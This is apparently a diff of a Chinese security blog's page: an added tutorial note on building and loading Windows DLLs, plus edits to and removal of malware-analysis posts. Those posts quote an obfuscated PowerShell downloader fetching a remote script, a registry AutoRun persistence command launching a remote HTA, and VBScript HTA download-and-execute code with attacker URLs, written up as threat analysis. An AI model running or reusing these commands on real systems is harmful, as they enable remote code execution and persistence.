+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="DLL-模块"><a href="#DLL-模块" class="headerlink" title="DLL 模块"></a>DLL 模块</h2><ul>
+<li>.dll</li>
+<li>.ocx, （Ole Control Extension） ，OCX控件，新的应用程序基本不再使用。</li>
+<li>.cpl,控制面板程序 ，双击即可启动。</li>
+</ul>
+<p>微软的补丁，通常是待更新的dll积累到一定程度后的一个Service Packs软件更新包。</p>
+<p>ELF的动态链接可以运行时加载，Win下用这种技术用得更多，例如ActiveX。</p>
+<p>Win32以后，进程有独立的地址空间，一个dll文件在不同的经常内部拥有不同的私有数据副本。</p>
+<p><strong>ELF的代码段是地址无关的，而DLL的代码并不是地址无关。</strong></p>
+<h3 id="DLL共享利用点："><a href="#DLL共享利用点：" class="headerlink" title="DLL共享利用点："></a>DLL共享利用点：</h3><p>DLL共享数据段实现进程间通信，此时，dll中往往有两个数据段，一个是把共享的数据单独拿出来作为一个段的进程间共享数据段，另一个私有。</p>
+<p>GUEST权限的用户可以通过修改DLL里的共享数据，影响到其他使用该 DLL文件的进程。因此，DLL共享数据段实现进程间通信应该尽量避免。</p>
+<h2 id="Dll开发"><a href="#Dll开发" class="headerlink" title="Dll开发"></a>Dll开发</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//防止C++编译器进行符号修饰</span></span><br><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">double</span> <span class="title">Add</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 减法函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">double</span> <span class="title">Subtract</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 乘法函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">double</span> <span class="title">Multiply</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;dumpbin /EXPORTS Dll1.dll</span><br><span class="line"></span><br><span class="line">    ordinal hint RVA      name</span><br><span class="line"></span><br><span class="line">          1    0 000110A0 Add</span><br><span class="line">          2    1 00011271 Multiply</span><br><span class="line">          3    2 000111C7 Subtract</span><br></pre></td></tr></table></figure>
+<p>​    .lib文件是一组目标文件的集合。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//加载静态链接库</span><br><span class="line">#pragma comment(lib,&quot;../Debug/libMathFunctions.lib&quot;)</span><br></pre></td></tr></table></figure>
+<h2 id="加载动态链接库"><a href="#加载动态链接库" class="headerlink" title="加载动态链接库"></a>加载动态链接库</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/houkai/archive/2013/06/05/3119513.html">https://www.cnblogs.com/houkai/archive/2013/06/05/3119513.html</a></p>
+</blockquote>
+<h3 id="隐式链接"><a href="#隐式链接" class="headerlink" title="隐式链接"></a>隐式链接</h3><p>1.2. 修改包含目录(.h所在文件)和库目录(.lib所在目录)</p>
+<p><img src="/categories/Notes/Linkers&Loaders05/1694166330701.png" alt="1694166330701"></p>
+<p>3.项目-&gt;属性-&gt;配置属性-&gt;链接器-&gt;输入-&gt; 在“附加依赖项”里添加“testdll.lib”（</p>
+<p>若有多个 lib 则以空格隔开） </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型（导入DLL中的函数）</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllimport) <span class="function"><span class="type">double</span> <span class="title">Add</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllimport) <span class="function"><span class="type">double</span> <span class="title">Subtract</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllimport) <span class="function"><span class="type">double</span> <span class="title">Multiply</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> x = <span class="number">10</span>;</span><br><span class="line">    <span class="type">double</span> y = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用DLL中的加法函数</span></span><br><span class="line">    <span class="type">double</span> sum = <span class="built_in">Add</span>(x, y);</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot; + &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; sum &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用DLL中的减法函数</span></span><br><span class="line">    <span class="type">double</span> difference = <span class="built_in">Subtract</span>(x, y);</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; difference &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用DLL中的乘法函数</span></span><br><span class="line">    <span class="type">double</span> product = <span class="built_in">Multiply</span>(x, y);</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot; * &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; product &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Ctrl+F7编译通过，但是程序运行就报错，</p>
+<p>还需要将testdll.dll复制到当前项目生成的可执行文件所在的目录。 </p>
+<h3 id="显示链接"><a href="#显示链接" class="headerlink" title="显示链接"></a>显示链接</h3><p> 项目菜单——项目属性——配置属性——常规——高级——字符集，将使用Unicode字符集改为未设置即可。 </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">double</span> <span class="params">(*pAdd)</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">double</span> <span class="params">(*pSubtract)</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line">    HMODULE hDLL = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;Dll1.dll&quot;</span>); <span class="comment">//加载dll文件，需要把dll拷贝到当前目录 </span></span><br><span class="line">    <span class="keyword">if</span> (hDLL != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        pAdd fp1 = <span class="built_in">pAdd</span>(<span class="built_in">GetProcAddress</span>(hDLL, <span class="built_in">MAKEINTRESOURCE</span>(<span class="number">1</span>))); <span class="comment">//得到dll中的第一个函数</span></span><br><span class="line">        <span class="keyword">if</span> (fp1 != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="built_in">fp1</span>(<span class="number">2.5</span>, <span class="number">5.5</span>) &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;Cannot Find Function &quot;</span> &lt;&lt; <span class="string">&quot;add&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        pSubtract fp2 = <span class="built_in">pSubtract</span>(<span class="built_in">GetProcAddress</span>(hDLL, <span class="string">&quot;Subtract&quot;</span>)); <span class="comment">//使用了externC，所以不用考虑C++修饰符</span></span><br><span class="line">        <span class="keyword">if</span> (fp2 != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="built_in">fp2</span>(<span class="number">5.5</span>, <span class="number">2.5</span>) &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;Cannot Find Function &quot;</span> &lt;&lt; <span class="string">&quot;Subtract&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">FreeLibrary</span>(hDLL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Cannot Find &quot;</span> &lt;&lt; <span class="string">&quot;Dll1.dll&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Shellcode03/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -204,7 +779,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="Emptet下载器"><a href="#Emptet下载器" class="headerlink" title="Emptet下载器"></a>Emptet下载器</h2><p>技术特点：利用大小写，空格加base64绕过特征检测。</p>
+          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Emptet下载器"><a href="#Emptet下载器" class="headerlink" title="Emptet下载器"></a>Emptet下载器</h2><p>技术特点：利用大小写，空格加base64绕过特征检测。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c powErshEll -nop -w hiddEn -Ep bypass -Enc &#123;base64_encoded_string&#125;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I E X   ( N e w - O b j e c t   N e t . W e b c l i e n t ) . d o w n l o a d s t r i n g ( &quot; h t t p : / / e d u c a t i o l i n k . c o m / i n d e x . p h p &quot; ) </span><br></pre></td></tr></table></figure>
 <p> 基础知识：</p>
@@ -284,7 +859,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>本文记录那些windows中的敏感目录和信息。</p>
+          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文记录那些windows中的敏感目录和信息。</p>
 <p>最近访问的文件、关键文件目录、操作系统配置、进程列表和常见目录等系统信息 </p>
 <h2 id="利用目录"><a href="#利用目录" class="headerlink" title="利用目录"></a>利用目录</h2><p>开机启动项目</p>
 <p>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
@@ -357,7 +932,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>本文记录那些可以被用来权限维持以及信息探测的注册表项。</p>
+          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文记录那些可以被用来权限维持以及信息探测的注册表项。</p>
 <h2 id="启动进程"><a href="#启动进程" class="headerlink" title="启动进程"></a>启动进程</h2><p><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</code> </p>
 <p>用于指定那些只需要在下次系统启动时运行一次的程序或命令。与此位置相关的命令或程序在执行完一次后通常会从此列表中自动删除。 </p>
 <h2 id="下载并执行"><a href="#下载并执行" class="headerlink" title="下载并执行"></a>下载并执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &#x27;HKCU\Software\Microsoft\Command Processor&#x27; </span><br><span class="line">/v AutoRun /t REG_SZ /d &#x27;mshta.exe&#x27; http:/exam/1.hta /f</span><br></pre></td></tr></table></figure>
@@ -377,714 +952,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/OfficeMacro01/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/OfficeMacro01/" class="post-title-link" itemprop="url">Office宏病毒</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-08-29 10:19:49 / Modified: 11:12:12" itemprop="dateCreated datePublished" datetime="2023-08-29T10:19:49+08:00">2023-08-29</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.nsfocus.net/apt-kimsuky-2/">东北亚APT-kimsuky</a>， 被认为来自朝鲜 </p>
-</blockquote>
-<h2 id="1-利用Office模板"><a href="#1-利用Office模板" class="headerlink" title="1.利用Office模板"></a>1.利用Office模板</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>模板具有特殊的文件格式，Word 2003 模板的文件扩展名为 .dot，Word 2007 及 Word 更高版本的模板文件的扩展名为 .dotx或 .dotm；dotx 为不包含 VBA 代码的模板；dotm 模板可以包含 VBA代码。</p>
-<p>创建模板后，可以通过模板文件的图标来区分模板是否可以包含 VBA代码。</p>
-<p>图标上带有叹号的模板文件，表示可以包含 VBA 代码；反之，图标上未带有叹号的模板文件，表示不能包含VBA 代码。</p>
-<h3 id="加载远程模板和恶意宏分离："><a href="#加载远程模板和恶意宏分离：" class="headerlink" title="加载远程模板和恶意宏分离："></a>加载远程模板和恶意宏分离：</h3><p> 2020年4月，Kimsuky利用韩国议会选举的热度[1]，投递了名为《第21届国民议会选举相关》的诱饵文档。该文档打开后会加载一个包含恶意宏的远程dotm模板，只有当dotm文件成功加载后，office才会提示用户启用宏。这种方法将初始钓鱼文档和包含恶意宏的远程文档分离，起到保护作用，因为初始文档除了加载远程模板外，并没有其他恶意行为。 </p>
-<h2 id="2-利用Hta"><a href="#2-利用Hta" class="headerlink" title="2.利用Hta"></a>2.利用Hta</h2><p>  HTML Application ， 由 Microsoft 创建 的文件格式， 允许 Web 技术（如 HTML、JavaScript 和 VBScript）创建独立的可执行应用程序像exe那样执行。 </p>
-<p> .hta 合法目的一般是用来创建简单的桌面应用程序 ，但它可以访问计算机上的文件、注册表等资源， 被滥用作为恶意攻击的工具。由mshta.exe执行。 </p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;vbscript&quot;</span>&gt;</span></span><br><span class="line">On Error Resume Next</span><br><span class="line">Set Posto = CreateObject(&quot;MSXML2.ServerXMLHTTP.6.0&quot;)</span><br><span class="line">Posto.open &quot;GET&quot;, &quot;baidu.com&quot;, False</span><br><span class="line">&#x27; http://hpurusymireene.com/theme/basic/skin/member/basic/upload/eweerew.php?er=1</span><br><span class="line">Posto.send</span><br><span class="line">to = Posto.responseText</span><br><span class="line">Execute(to)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--一个简单的子序列拼接函数--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--输入&#x27;123456789abcdefghiklm&#x27;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--输出&#x27;&#x27;1a2b3c4d5e6f7g8h9iklm&#x27;&#x27;--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;vbscript&quot;</span>&gt;</span></span><br><span class="line">On Error Resume Next</span><br><span class="line"></span><br><span class="line">Function cooo(c)</span><br><span class="line">    L = Len(c)</span><br><span class="line">    s = &quot;&quot;</span><br><span class="line">    d = 9</span><br><span class="line">    For jx = 0 To d - 1</span><br><span class="line">        For ix = 0 To Int(L/d) - 1</span><br><span class="line">            s = s &amp; Mid(c, ix*d+jx+1, 1)</span><br><span class="line">        Next</span><br><span class="line">    Next</span><br><span class="line">    s = s &amp; Right(c, L - Int(L/d) * d)</span><br><span class="line">    cooo = s</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Set Posto = CreateObject(&quot;MSXML2.ServerXMLHTTP.6.0&quot;)</span><br><span class="line">Posto.open &quot;GET&quot;, &quot;baidu.com&quot;, False</span><br><span class="line">&#x27; https://christinadudley.com/public_html/edudley/sites/default/files/1203427/expres.php?op=1</span><br><span class="line">Posto.send</span><br><span class="line">to = Posto.responseText</span><br><span class="line">to = cooo(to)</span><br><span class="line">Execute(to)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="延迟执行："><a href="#延迟执行：" class="headerlink" title="延迟执行："></a>延迟执行：</h3><p> 某些变种在设置使用mshta下载hta的计划任务时，会令其不立即启动，以对抗某些单个程序运行时间受限的沙箱。 </p>
-<h2 id="3-触发链"><a href="#3-触发链" class="headerlink" title="3.触发链"></a>3.触发链</h2><p> 2019年3月，Kimsuky利用韩日在二战赔偿问题上的僵持局面，伪装成韩国外交部投递了名为“20190312日本每日趋势”的hwp诱饵文档 </p>
-<h3 id="韩国hwp-eps"><a href="#韩国hwp-eps" class="headerlink" title="韩国hwp eps"></a>韩国hwp eps</h3><p> hwp是韩国hansoft开发的hangul办公软件使用的文档   EPS(Encapsulated PostScript)， 这种脚本是Adobe推出的PostScript脚本（一种用于初版行业的打印机编程语言）的分支 ， 可以被利用来包含恶意代码。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hwp-&gt;eps-&gt;powershell--&gt;wsf--&gt;js--&gt;恶意组件</span><br></pre></td></tr></table></figure>
-<h2 id="4-利用pdf文档"><a href="#4-利用pdf文档" class="headerlink" title="4.利用pdf文档"></a>4.利用pdf文档</h2><p> Kimsuky在今年5~8月转而使用携带漏洞的恶意pdf文档，借用南北议题作为诱饵对韩国政府人员进行攻击 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pdf--&gt;adobe acrobat漏洞cve-2020-9715触发---&gt;内嵌隐藏的恶意JS-&gt;解密pe</span><br><span class="line">文件--&gt;内存加载执行</span><br></pre></td></tr></table></figure>
-<h2 id="5-VBS和VBA"><a href="#5-VBS和VBA" class="headerlink" title="5.VBS和VBA"></a>5.VBS和VBA</h2><p> VBA (Visual Basic for Applications) 和 VBS (VBScript) 都是基于 Visual Basic 语言的脚本语言， </p>
-<p>VBS 通过wscript.exe（图形版）或者cscript.exe（命令行版）执行。</p>
-<p> <strong>VBA</strong>：主要用于 Microsoft Office 应用程序（如 Excel、Word、Access）中的宏编程。 </p>
-<p> 2020年6月，Kimsuky投递名为“朝鲜加强核战争威慑的措施及韩国的应对”的诱饵邀稿函，让目标就朝鲜第七届中央军事委员会，撰写文章进行评价与展望 </p>
-<p>技术特点：关键命令并不位于vba宏里，因此直接对宏进行静态检测将难以发现威胁 </p>
-<p>形式特点： 当用户点击启用内容后，真实表格才会显示出来 。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Shellcode01/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/Shellcode01/" class="post-title-link" itemprop="url">CLSID利用</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-08-28 14:19:49" itemprop="dateCreated datePublished" datetime="2023-08-28T14:19:49+08:00">2023-08-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-08-30 12:52:23" itemprop="dateModified" datetime="2023-08-30T12:52:23+08:00">2023-08-30</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <blockquote>
-<p>关于CLSID的利用，抄袭<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15127538/2706618">https://blog.51cto.com/u_15127538/2706618</a>.</p>
-<p><a target="_blank" rel="noopener" href="https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day/">https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day/</a></p>
-</blockquote>
-<p>启动 <strong>DarkMe</strong> backdoor ：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe /sta &#123;EA6FC2FF-7AE6-4534-9495-F688FEC7858C&#125; </span><br></pre></td></tr></table></figure>
